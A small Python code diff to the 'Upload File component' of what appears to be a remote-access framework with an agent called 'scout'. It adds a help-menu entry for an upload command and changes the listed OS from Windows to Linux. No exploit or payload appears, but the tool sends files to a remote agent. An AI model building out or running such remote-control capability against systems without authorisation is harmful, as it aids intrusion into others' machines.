@@ -18,9 +18,10 @@ def upload():
         config.logics.append('''
             elif command == "upload":
                 upload()''')
+        config.help_menu['upload <Local file path>'] = 'Remotely upload a file to remote current working directory of scout'
     elif option == 'info':
         print '\nName             : Upload File component' \
-              '\nOS               : Windows' \
+              '\nOS               : Linux' \
               '\nRequired Modules : pickle' \
-              '\nCommands         : upload <local file path>' \
+              '\nCommands         : upload <Local file path>' \
               '\nDescription      : Remotely upload a file to remote current working directory of scout\n'
